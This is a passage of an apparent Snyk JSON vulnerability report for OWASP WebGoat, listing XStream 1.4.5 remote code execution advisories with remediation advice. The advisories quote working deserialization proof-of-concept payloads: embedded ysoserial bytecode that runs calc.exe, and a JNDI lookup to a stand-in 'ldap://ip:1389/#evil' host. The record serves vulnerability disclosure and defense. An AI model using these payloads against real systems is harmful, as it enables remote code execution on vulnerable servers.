xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAyADMKACsANAEADVN0YWNrTWFwVGFibGUBAB55c29zZXJpYWwvUHduZXIyMDU0MTY0NDMxMDIwMTkBACBMeXNvc2VyaWFsL1B3bmVyMjA1NDE2NDQzMTAyMDE5OwAhAAIAAwABAAQAAQAaAAUABgABAAcAAAACAAgABAABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAC8ADgAAAAwAAQAAAAUADwA4AAAAAQATABQAAgAMAAAAPwAAAAMAAAABsQAAAAIADQAAAAYAAQAAADQADgAAACAAAwAAAAEADwA4AAAAAAABABUAFgABAAAAAQAXABgAAgAZAAAABAABABoAAQATABsAAgAMAAAASQAAAAQAAAABsQAAAAIADQAAAAYAAQAAADgADgAAACoABAAAAAEADwA4AAAAAAABABUAFgABAAAAAQAcAB0AAgAAAAEAHgAfAAMAGQAAAAQAAQAaAAgAKQALAAEADAAAACQAAwACAAAAD6cAAwFMuAAvEjG2ADVXsQAAAAEANgAAAAMAAQMAAgAgAAAAAgAhABEAAAAKAAEAAgAjABAACQ==</byte-array>\r\n                    <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ</byte-array>\r\n                  </__bytecodes>\r\n                  <__transletIndex>-1</__transletIndex>\r\n                  <__indentNumber>0</__indentNumber>\r\n                </default>\r\n              </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\r\n            </bean>\r\n            <localCache>\r\n              <methods>\r\n                <entry>\r\n                  <string>getOutputProperties</string>\r\n                  <list>\r\n                    <method>\r\n                      <class>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</class>\r\n                      <name>getOutputProperties</name>\r\n                      <parameter-types/>\r\n                    </method>\r\n                  </list>\r\n                </entry>\r\n              </methods>\r\n            </localCache>\r\n          </attrIndexTable>\r\n          <shortCodeHeader__h__limit>0</shortCodeHeader__h__limit>\r\n        </outer-class>\r\n      </comparator>\r\n    </default>\r\n    <int>3</int>\r\n    <string-array>\r\n      <string>yxxx</string>\r\n      <string>outputProperties</string>\r\n    </string-array>\r\n    <string-array>\r\n      <string>yxxx</string>\r\n    </string-array>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39153.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T07:35:41Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569176",
      "identifiers": {
        "CWE": [
          "CWE-434"
        ],
        "GHSA": [
          "GHSA-2q8x-2p7f-574v"
        ],
        "CVE": [
          "CVE-2021-39153"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-24T15:09:22.886369Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:22.884471Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39153.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:39:27.044366Z"
        },
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:33.771075Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T21:35:15.662265Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T07:44:55.759327Z",
      "credit": [
        "Ceclin and YXXX"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. This vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.\r\n\r\n### PoC\r\n\r\n```\r\n<java.util.PriorityQueue serialization='custom'>\r\n  <unserializable-parents/>\r\n  <java.util.PriorityQueue>\r\n    <default>\r\n      <size>2</size>\r\n    </default>\r\n    <int>3</int>\r\n    <dynamic-proxy>\r\n      <interface>java.lang.Comparable</interface>\r\n      <handler class='com.sun.xml.internal.ws.client.sei.SEIStub'>\r\n        <owner/>\r\n        <managedObjectManagerClosed>false</managedObjectManagerClosed>\r\n        <databinding class='com.sun.xml.internal.ws.db.DatabindingImpl'>\r\n          <stubHandlers>\r\n            <entry>\r\n              <method>\r\n                <class>java.lang.Comparable</class>\r\n                <name>compareTo</name>\r\n                <parameter-types>\r\n                  <class>java.lang.Object</class>\r\n                </parameter-types>\r\n              </method>\r\n              <com.sun.xml.internal.ws.client.sei.StubHandler>\r\n                <bodyBuilder class='com.sun.xml.internal.ws.client.sei.BodyBuilder$DocLit'>\r\n                  <indices>\r\n                    <int>0</int>\r\n                  </indices>\r\n                  <getters>\r\n                    <com.sun.xml.internal.ws.client.sei.ValueGetter>PLAIN</com.sun.xml.internal.ws.client.sei.ValueGetter>\r\n                  </getters>\r\n                  <accessors>\r\n                    <com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2>\r\n                      <val_-isJAXBElement>false</val_-isJAXBElement>\r\n                      <val_-getter class='com.sun.xml.internal.ws.spi.db.FieldGetter'>\r\n                        <type>int</type>\r\n                        <field>\r\n                          <name>hash</name>\r\n                          <clazz>java.lang.String</clazz>\r\n                        </field>\r\n                      </val_-getter>\r\n                      <val_-isListType>false</val_-isListType>\r\n                      <val_-n>\r\n                        <namespaceURI/>\r\n                        <localPart>hash</localPart>\r\n                        <prefix/>\r\n                      </val_-n>\r\n                      <val_-setter class='com.sun.xml.internal.ws.spi.db.MethodSetter'>\r\n                        <type>java.lang.String</type>\r\n                        <method>\r\n                          <class>javax.naming.InitialContext</class>\r\n                          <name>doLookup</name>\r\n                          <parameter-types>\r\n                            <class>java.lang.String</class>\r\n                          </parameter-types>\r\n                        </method>\r\n                      </val_-setter>\r\n                      <outer-class>\r\n                        <propertySetters>\r\n                          <entry>\r\n                            <string>serialPersistentFields</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                              <type>[Ljava.io.ObjectStreamField;</type>\r\n                              <field>\r\n                                <name>serialPersistentFields</name>\r\n                                <clazz>java.lang.String</clazz>\r\n                              </field>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>CASE_INSENSITIVE_ORDER</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                              <type>java.util.Comparator</type>\r\n                              <field>\r\n                                <name>CASE_INSENSITIVE_ORDER</name>\r\n                                <clazz>java.lang.String</clazz>\r\n                              </field>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>serialVersionUID</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                              <type>long</type>\r\n                              <field>\r\n                                <name>serialVersionUID</name>\r\n                                <clazz>java.lang.String</clazz>\r\n                              </field>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>value</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                              <type>[C</type>\r\n                              <field>\r\n                                <name>value</name>\r\n                                <clazz>java.lang.String</clazz>\r\n                              </field>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>hash</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                              <type>int</type>\r\n                              <field reference='../../../../../val_-getter/field'/>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldSetter>\r\n                          </entry>\r\n                        </propertySetters>\r\n                        <propertyGetters>\r\n                          <entry>\r\n                            <string>serialPersistentFields</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                              <type>[Ljava.io.ObjectStreamField;</type>\r\n                              <field reference='../../../../propertySetters/entry/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>CASE_INSENSITIVE_ORDER</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                              <type>java.util.Comparator</type>\r\n                              <field reference='../../../../propertySetters/entry[2]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>serialVersionUID</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                              <type>long</type>\r\n                              <field reference='../../../../propertySetters/entry[3]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>value</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                              <type>[C</type>\r\n                              <field reference='../../../../propertySetters/entry[4]/com.sun.xml.internal.ws.spi.db.FieldSetter/field'/>\r\n                            </com.sun.xml.internal.ws.spi.db.FieldGetter>\r\n                          </entry>\r\n                          <entry>\r\n                            <string>hash</string>\r\n                            <com.sun.xml.internal.ws.spi.db.FieldGetter reference='../../../../val_-getter'/>\r\n                          </entry>\r\n                        </propertyGetters>\r\n                        <elementLocalNameCollision>false</elementLocalNameCollision>\r\n                        <contentClass>java.lang.String</contentClass>\r\n                        <elementDeclaredTypes/>\r\n                      </outer-class>\r\n                    </com.sun.xml.internal.ws.spi.db.JAXBWrapperAccessor_-2>\r\n                  </accessors>\r\n                  <wrapper>java.lang.Object</wrapper>\r\n                  <bindingContext class='com.sun.xml.internal.ws.db.glassfish.JAXBRIContextWrapper'/>\r\n                  <dynamicWrapper>false</dynamicWrapper>\r\n                </bodyBuilder>\r\n                <isOneWay>false</isOneWay>\r\n              </com.sun.xml.internal.ws.client.sei.StubHandler>\r\n            </entry>\r\n          </stubHandlers>\r\n          <clientConfig>false</clientConfig>\r\n        </databinding>\r\n        <methodHandlers>\r\n          <entry>\r\n            <method reference='../../../databinding/stubHandlers/entry/method'/>\r\n            <com.sun.xml.internal.ws.client.sei.SyncMethodHandler>\r\n              <owner reference='../../../..'/>\r\n              <method reference='../../../../databinding/stubHandlers/entry/method'/>\r\n              <isVoid>false</isVoid>\r\n              <isOneway>false</isOneway>\r\n            </com.sun.xml.internal.ws.client.sei.SyncMethodHandler>\r\n          </entry>\r\n        </methodHandlers>\r\n      </handler>\r\n    </dynamic-proxy>\r\n    <string>ldap://ip:1389/#evil</string>\r\n  </java.util.PriorityQueue>\r\n</java.util.PriorityQueue>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39141.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T07:43:43Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569177",
      "identifiers": {
        "CWE": [
          "CWE-434"
        ],
        "GHSA": [
          "GHSA-g5w6-mrj7-75h2"
        ],
        "CVE": [
          "CVE-2021-39141"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-09-06T15:25:00.275514Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:22.653112Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39141.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:40:13.219177Z"
        },
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:30.674343Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T21:35:02.039644Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T07:51:04.130182Z",
      "credit": [
        "Lai Han"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. This vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. A user is only affected if using the version out of the box with JDK 1.7u21 or below.  However, this scenario can be adjusted easily to an external Xalan that works regardless of the version of the Java runtime. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.\r\n\r\n### PoC\r\n\r\n```\r\n<linked-hash-set>\r\n  <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl serialization='custom'>\r\n    <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\r\n      <default>\r\n        <__name>Pwnr</__name>\r\n        <__bytecodes>\r\n          <byte-array>yv66vgAAADIAOQoAAwAiBwA3BwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJDbGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNsZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAfeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cwEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHACoBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAsAC0KACsALgEACGNhbGMuZXhlCAAwAQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwwAMgAzCgArADQBAA1TdGFja01hcFRhYmxlAQAeeXNvc2VyaWFsL1B3bmVyNDE2NTkyOTE1MTgwNjAwAQAgTHlzb3NlcmlhbC9Qd25lcjQxNjU5MjkxNTE4MDYwMDsAIQACAAMAAQAEAAEAGgAFAAYAAQAHAAAAAgAIAAQAAQAKAAsAAQAMAAAALwABAAEAAAAFKrcAAbEAAAACAA0AAAAGAAEAAAAvAA4AAAAMAAEAAAAFAA8AOAAAAAEAEwAUAAIADAAAAD8AAAADAAAAAbEAAAACAA0AAAAGAAEAAAA0AA4AAAAgAAMAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAFwAYAAIAGQAAAAQAAQAaAAEAEwAbAAIADAAAAEkAAAAEAAAAAbEAAAACAA0AAAAGAAEAAAA4AA4AAAAqAAQAAAABAA8AOAAAAAAAAQAVABYAAQAAAAEAHAAdAAIAAAABAB4AHwADABkAAAAEAAEAGgAIACkACwABAAwAAAAkAAMAAgAAAA+nAAMBTLgALxIxtgA1V7EAAAABADYAAAADAAEDAAIAIAAAAAIAIQARAAAACgABAAIAIwAQAAk=</byte-array>\r\n          <byte-array>yv66vgAAADIAGwoAAwAVBwAXBwAYBwAZAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFudFZhbHVlBXHmae48bUcYAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAANGb28BAAxJbm5lckNsYXNzZXMBACVMeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb287AQAKU291cmNlRmlsZQEADEdhZGdldHMuamF2YQwACgALBwAaAQAjeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRGb28BABBqYXZhL2xhbmcvT2JqZWN0AQAUamF2YS9pby9TZXJpYWxpemFibGUBAB95c29zZXJpYWwvcGF5bG9hZHMvdXRpbC9HYWRnZXRzACEAAgADAAEABAABABoABQAGAAEABwAAAAIACAABAAEACgALAAEADAAAAC8AAQABAAAABSq3AAGxAAAAAgANAAAABgABAAAAPAAOAAAADAABAAAABQAPABIAAAACABMAAAACABQAEQAAAAoAAQACABYAEAAJ</byte-array>\r\n        </__bytecodes>\r\n        <__transletIndex>-1</__transletIndex>\r\n        <__indentNumber>0</__indentNumber>\r\n      </default>\r\n    </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\r\n  </com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>\r\n  <dynamic-proxy>\r\n    <interface>javax.xml.transform.Templates</interface>\r\n    <handler class='sun.reflect.annotation.AnnotationInvocationHandler' serialization='custom'>\r\n      <sun.reflect.annotation.AnnotationInvocationHandler>\r\n        <default>\r\n          <memberValues>\r\n            <entry>\r\n              <string>f5a5a608</string>\r\n              <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl reference='../../../../../../../com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl'/>\r\n            </entry>\r\n          </memberValues>\r\n          <type>javax.xml.transform.Templates</type>\r\n        </default>\r\n      </sun.reflect.annotation.AnnotationInvocationHandler>\r\n    </handler>\r\n  </dynamic-proxy>\r\n</linked-hash-set>\r\n```\r\n\r\n```\r\nXStream xstream = new XStream();\r\nxstream.fromXML(xml);\r\n```\n## Remediation\nUpgrade `com.thoughtworks.xstream:xstream` to version 1.4.18 or higher.\n## References\n- [XStream Advisory](https://x-stream.github.io/CVE-2021-39139.html)\n- [XStream Changelog](https://x-stream.github.io/changes.html#1.4.18)\n",
      "disclosureTime": "2021-08-24T07:49:36Z",
      "exploit": "Proof of Concept",
      "functions": [],
      "fixedIn": [
        "1.4.18"
      ],
      "id": "SNYK-JAVA-COMTHOUGHTWORKSXSTREAM-1569178",
      "identifiers": {
        "CWE": [
          "CWE-502"
        ],
        "GHSA": [
          "GHSA-64xx-cq4q-mf44"
        ],
        "CVE": [
          "CVE-2021-39139"
        ]
      },
      "language": "java",
      "malicious": false,
      "modificationTime": "2021-08-24T15:09:25.725200Z",
      "moduleName": "com.thoughtworks.xstream:xstream",
      "packageManager": "maven",
      "packageName": "com.thoughtworks.xstream:xstream",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-08-24T15:09:25.723467Z",
      "references": [
        {
          "title": "XStream Advisory",
          "url": "https://x-stream.github.io/CVE-2021-39139.html"
        },
        {
          "title": "XStream Changelog",
          "url": "https://x-stream.github.io/changes.html%231.4.18"
        }
      ],
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Arbitrary Code Execution",
      "insights": {
        "triageAdvice": null
      },
      "cvssDetails": [
        {
          "assigner": "NVD",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.8,
          "severity": "high",
          "modificationTime": "2022-07-26T01:11:32.476177Z"
        },
        {
          "assigner": "SUSE",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.1,
          "severity": "high",
          "modificationTime": "2022-05-03T21:35:09.092864Z"
        },
        {
          "assigner": "RHEL",
          "cvssV3Vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H",
          "cvssV3BaseScore": 8.5,
          "severity": "high",
          "modificationTime": "2022-09-01T19:40:07.568694Z"
        }
      ],
      "functions_new": [],
      "semver": {
        "vulnerable": [
          "[,1.4.18)"
        ]
      },
      "mavenModuleName": {
        "groupId": "com.thoughtworks.xstream",
        "artifactId": "xstream"
      },
      "severityWithCritical": "high",
      "from": [
        "org.owasp.webgoat:webgoat@8.2.3-SNAPSHOT",
        "com.thoughtworks.xstream:xstream@1.4.5"
      ],
      "upgradePath": [
        false,
        "com.thoughtworks.xstream:xstream@1.4.18"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.thoughtworks.xstream:xstream",
      "version": "1.4.5"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H/E:P",
      "alternativeIds": [],
      "creationTime": "2021-08-24T07:55:15.088252Z",
      "credit": [
        "Smi1e"
      ],
      "cvssScore": 8.5,
      "description": "## Overview\n[com.thoughtworks.xstream:xstream](https://x-stream.github.io/) is a simple library to serialize objects to XML and back again.\n\nAffected versions of this package are vulnerable to Arbitrary Code Execution. This vulnerability may allow a remote attacker to load and execute arbitrary code from a remote host only by manipulating the processed input stream. No user is affected, who followed the recommendation to setup XStream's security framework with a whitelist limited to the minimal required types. XStream 1.4.18 uses no longer a blacklist by default, since it cannot be secured for general purpose.\r\n\r\n\r\n### PoC\r\n\r\n```\r\n<javax.swing.event.EventListenerList serialization='custom'>\r\n  <javax.swing.event.EventListenerList>\r\n    <default>\r\n      <listenerList>\r\n        <javax.swing.undo.UndoManager>\r\n          <hasBeenDone>true</hasBeenDone>\r\n          <alive>true</alive>\r\n          <inProgress>true</inProgress>\r\n          <edits>\r\n            <com.sun.xml.internal.ws.api.message.Packet>\r\n              <message class='com.sun.xml.internal.ws.message.saaj.SAAJMessage'>\r\n                <parsedMessage>true</parsedMessage>\r\n                <soapVersion>SOAP_11</soapVersion>\r\n                <bodyParts/>\r\n                <sm class='com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl'>\r\n                  <attachmentsInitialized>false</attachmentsInitialized>\r\n                  <multiPart class='com.sun.xml.internal.messaging.saaj.packaging.mime.internet.MimePullMultipart'>\r\n                    <soapPart/>\r\n                    <mm>\r\n                      <it class='com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator'>\r\n                        <aliases class='com.sun.jndi.ldap.LdapBindingEnumeration'>\r\n                          <cleaned>false</cleaned>\r\n                          <entries>\r\n                            <com.sun.jndi.ldap.LdapEntry>\r\n                              <DN>cn=four,cn=three,cn=two,cn=one</DN>\r\n                              <attributes class='javax.naming.directory.BasicAttributes' serialization='custom'>\r\n                                <javax.naming.directory.BasicAttribute>\r\n                                  <default>\r\n                                    <ignoreCase>false</ignoreCase>\r\n                                  </default>\r\n                                  <int>4</int>\r\n                                  <com.sun.jndi.ldap.LdapAttribute serialization='custom'>\r\n                                    <javax.naming.directory.BasicAttribute>\r\n                                      <default>\r\n                                        <ordered>false</ordered>\r\n                                        <attrID>objectClass</attrID>\r\n                                      </default>\r\n                                      <int>1</int>\r\n                                      <string>javanamingreference</string>\r\n                                    </javax.naming.directory.BasicAttribute>\r\n                                    <com.sun.jndi.ldap.LdapAttribute>\r\n                                      <default>\r\n                                        <rdn class='com.sun.jndi.ldap.LdapName' serialization='custom'>\r\n                                          <com.sun.jndi.ldap.LdapName>\r\n                                            <string>cn=four,cn=three,cn=two,cn=one</string>\r\n                                            <boolean>false</boolean>\r\n                                          